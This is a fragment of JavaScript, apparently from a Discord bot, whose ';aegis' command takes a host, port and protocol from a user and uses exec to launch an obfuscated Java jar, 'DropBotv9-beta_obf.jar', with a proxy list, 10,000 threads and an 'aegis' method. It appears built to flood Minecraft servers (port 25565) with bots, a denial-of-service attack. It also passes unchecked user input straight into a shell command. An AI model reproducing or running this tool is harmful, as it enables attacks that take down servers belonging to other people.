...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu ;aegis 1.1.1.1 25565 47`")
...
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=proxies.txt threads=10000 method=aegis version=${protocol} license=123ascqweq11`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
